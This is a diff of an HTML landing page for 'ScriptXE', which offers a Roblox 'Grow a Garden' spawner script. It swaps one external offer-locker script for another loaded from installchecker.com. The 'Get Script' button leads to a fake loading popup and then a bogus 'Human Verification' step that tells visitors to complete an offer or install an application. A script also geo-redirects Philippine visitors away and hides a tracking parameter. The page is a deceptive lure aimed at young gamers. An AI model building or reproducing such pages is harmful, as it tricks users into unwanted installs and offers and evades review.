@@ -7,13 +7,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
-  
+
   <link rel="icon" type="image/png" sizes="16x16" href="https://i.ibb.co/N224P2Zv/favicon-16x16.png" />
 
-  <script type="text/javascript">
-    var xCcaE_tyj_gRtEOc = { "it": 4503571, "key": "05c5f" };
-  </script>
-  <script src="https://dlk457skl57zp.cloudfront.net/9e771fa.js"></script>
+  <script type="text/javascript" id="ogjs" src="https://installchecker.com/cl/js/kld9n8"></script>
 
   <style>
     body {
@@ -21,89 +18,73 @@
       margin: 0;
       padding: 0;
       text-align: center;
-      background: url('https://i.ibb.co/27H11GN7/night-sky-with-white-stars-space-background-167650-2077.jpg') no-repeat center center;
-      background-color: #171717;
+      background-color: #1e1e1e;
       color: white;
       background-size: cover;
       background-attachment: scroll;
     }
 
     header {
-      background: url('https://i.ibb.co/mrPm6WcN/istockphoto-1971122203-612x612.jpg') center center / cover no-repeat;
-      width: 100vw;
-      height: 180px;
+      position: relative;
+      background-color: #1961f3;
+      width: 100%;
+      height: 245px;
       color: white;
-      padding: 60px 24px;
       text-align: center;
       font-size: 22px;
       font-weight: bold;
-      position: relative;
       overflow: hidden;
       box-sizing: border-box;
-      border-radius: 0 0 10px 10px;
+      font-family: 'Poppins', sans-serif;
     }
+
+    .text-wrapper {
+      position: relative;
+      z-index: 1;
+      padding-top: 60px;
+    }
+
 
     .card {
       max-width: 600px;
-      border: 1px solid white;
-      margin-top: 15px !important;
+      margin-top: 35px !important;
       margin: 40px auto;
-      background: #131313;
+      background: #2d2d2d;
+      box-shadow: 0 0px 8px rgba(0, 0, 0, 0.2);
       border-radius: 16px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
       padding: 24px;
+      color: #ffffff;
       text-align: center;
       display: flex;
       flex-direction: column;
       align-items: center;
     }
 
-    .left {
+    .card-child {
       flex: 1;
-      min-width: 300px;
-      padding: 20px;
+      min-width: 100px;
+      padding: 0px;
     }
 
-    .left img {
-      width: 60%;
-      height: 60%;
-      border-radius: 20px;
+    .card-child img {
+      width: 40%;
+      height: 40%;
       object-fit: cover;
+      margin-top: -15px;
+      margin-bottom: -30px;
+
     }
 
-    .left h2 {
+    .card-child h2 {
       margin: 16px 0 8px;
       font-size: 24px;
       font-weight: bold;
     }
 
-    .rating {
-      color: #facc15;
-      font-size: 16px;
-      margin-bottom: 10px;
-    }
-
-    .votes {
-      color: #fff;
-      font-size: 14px;
-    }
-
-    .desc {
-      margin-top: 14px;
-      line-height: 1.6;
-      font-size: 16px;
-    }
-
-    .right {
-      flex: 2;
-      min-width: 300px;
-      padding: 20px;
-    }
-
     .download-btn {
       display: inline-block;
-      margin-top: 40px;
-      background: linear-gradient(135deg, #4700cb, #7c40cb);
+      margin-top: 20px;
+      background-color: #1961f3;
       color: white;
       padding: 12px 24px;
       font-size: 16px;
@@ -113,10 +94,6 @@
       transition: background 0.3s ease;
       animation: pulseScale 2s infinite ease-in-out;
       cursor: pointer;
-    }
-
-    .download-btn:hover {
-      background: linear-gradient(135deg, #4700cb, #7c40cb);
     }
 
     @keyframes pulseScale {
@@ -163,10 +140,11 @@
     }
 
     .popup-header {
-      font-size: 22px;
+      font-size: 18px;
       margin-bottom: 15px;
       color: #ff4757;
       text-align: center;
+      font-weight: bold;
     }
 
     .popup-text {
@@ -212,11 +190,14 @@
       color: white;
       border: none;
       padding: 12px 20px;
-      border-radius: 5px;
-      width: 100%;
-      font-size: 16px;
+      border-radius: 12px;
+      width: 42%;
+      font-size: 18px;
       cursor: pointer;
       transition: background-color 0.3s;
+      font-weight: bold;
+      animation: pulseScale 2s infinite ease-in-out;
+
     }
 
     .verify-btn:hover {
@@ -232,32 +213,39 @@
       font-family: 'Poppins', sans-serif;
     }
 
-    .head {
-      font-size: 12px;
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin-bottom: 20px;
+    }
+
+    .upper-text {
+      font-size: 40px;
       font-weight: normal;
       margin-bottom: -0px;
       margin-top: -15px;
+      font-weight: bold;
     }
 
-    .grow {
+    .lower-text {
+      font-size: 14px;
       margin-bottom: 20px;
       margin-top: 0px;
+      font-weight: lighter;
     }
 
     .text-wrapper {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
+      position: relative;
+      top: auto;
+      left: auto;
+      transform: none;
+      padding-top: 30px;
       display: flex;
       flex-direction: column;
-      /* stack vertically */
       align-items: center;
       justify-content: center;
       gap: 5px;
-      /* spacing between texts */
       width: 100%;
-      /* optional: stretch full width */
       color: white;
       pointer-events: auto;
     }
@@ -269,21 +257,19 @@
 
   <header>
     <div class="text-wrapper">
-      <h3 class="grow">ScriptXe</h3>
-      <p class="head">the ultimate site for roblox scripts. powered by ScriptXe.</p>
+      <img class="logo" src="https://i.ibb.co/Dfc5KR2Q/8b50a9a49c4190dcb4c884b048143803.png" alt="logo">
+      <h3 class="upper-text">ScriptXE</h3>
+      <p class="lower-text">the ultimate site for roblox scripts. powered by scriptxe.</p>
     </div>
   </header>
 
   <div class="card">
-    <div class="left">
-      <img src="https://i.ibb.co/vxbTrmrB/grow-a-garden.webp" alt="grow-a-garden">
-      <h2>[☀️] Grow a Garden Spawn Pets and Seeds Script.</h2>
-      <div><span class="votes"> This script is just for fun and required key! Pets and seeds are visual only they show
+    <div class="card-child">
+      <img src="https://i.ibb.co/mr7sCDpj/Add-a-heading.png" alt="grow-a-garden">
+      <h2>[☀️] Grow a Garden Pets and Seeds Spawner Script.</h2>
+      <div><span class="votes"> This script is for fun and required key! Pets and seeds are visual only they show
           up on your screen but aren't real in-game and can't be seen by other players. Still super cool to try and
-          build your own garden vibe! Unlock a chill gardening experience where you can spawn visual pets and seeds
-          anywhere, decorate your space, and get creative. Updated for the latest Grow a Garden version perfect for
-          aesthetic farming and relaxing visuals!</span></div>
-
+          build your own garden vibe! </span></div>
       <a href="#" class="download-btn">Get Script</a>
     </div>
   </div>
@@ -292,22 +278,9 @@
     &copy; 2025 scriptxe. All rights reserved.
   </footer>
 
-  <script>
-    (function () {
-      if (window.location.search.indexOf('m=1') !== -1) {
-
-        let url = new URL(window.location.href);
-        url.searchParams.delete('m');
-
-        window.history.replaceState({}, document.title, url.pathname + url.search + url.hash);
-      }
-    })();
-
-  </script>
-
   <div class="popup-overlay" id="scriptPopup">
     <div class="popup-content">
-      <div class="popup-header">Loading Script</div>
+      <div class="popup-header">Loading Script...</div>
       <div class="script-code">
         <div id="scriptText"></div>
       </div>
@@ -318,9 +291,9 @@
     <div class="popup-content">
       <div class="popup-header">Human Verification Required</div>
       <div class="popup-text">
-        Please verify you are not a robot. Click verify and complete one offer to unlock the full script.
+        Complete one offer or install one application to verify you are not a robot.
       </div>
-      <button class="verify-btn" id="verifyButton">Verify</button>
+      <button class="verify-btn" id="verifyButton">Continue</button>
     </div>
   </div>
 
@@ -353,31 +326,31 @@
 
     document.getElementById('verifyButton').addEventListener('click', function () {
       document.getElementById('verifyPopup').classList.remove('active');
-      if (typeof _Pg === 'function') {
-        _Pg();
+      if (typeof og_load === 'function') {
+        og_load();
       } else {
-        console.error("_Pg function not found");
+        console.error("og_load function not found");
       }
     });
 
   </script>
 
   <div id="tiktok-fallback" style="
-  display: none;  
-  position: fixed;
-  top: 0; left: 0;  
-  width: 100vw; height: 100vh;
-  background: white;
-  z-index: 9999;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  text-align: center;
-  font-family: sans-serif;
-  color: black;
-  padding: 20px;
-  box-sizing: border-box;
-  overflow-wrap: break-word;                                                 ">
+      display: none;  
+      position: fixed;
+      top: 0; left: 0;  
+      width: 100vw; height: 100vh;
+      background: white;
+      z-index: 9999;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      font-family: sans-serif;
+      color: black;
+      padding: 20px;
+      box-sizing: border-box;
+      overflow-wrap: break-word;                                                 ">
 
     <img src="https://i.postimg.cc/kM6GVNVf/up-right-arrow-2.png"
       style="position: absolute; top: 0px; right: 45px; width: 60px; height: 60px; pointer-events: none;" />
@@ -420,19 +393,24 @@
   </script>
 
   <script>
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(data => {
-        if (data.country_code === 'PH') {
-          // Try to redirect first
-          window.location.replace("https://www.google.com");
+    (function () {
+      if (window.location.search.indexOf('m=1') !== -1) {
 
-          // Fallback if redirect fails
-          document.body.innerHTML = `
-          <div style="text-align:center; margin-top:100px; font-family:sans-serif;">
-            <h2>Sorry, this content is not available right now.</h2>
-          </div>
-        `;
+        let url = new URL(window.location.href);
+        url.searchParams.delete('m');
+
+        window.history.replaceState({}, document.title, url.pathname + url.search + url.hash);
+      }
+    })();
+
+  </script>
+
+  <script>
+    fetch('https://ipapi.co/json/')
+      .then(r => r.json())
+      .then(d => {
+        if (d.country_code === 'PH') {
+          window.location.href = "https://google.com";
         }
       });
   </script>
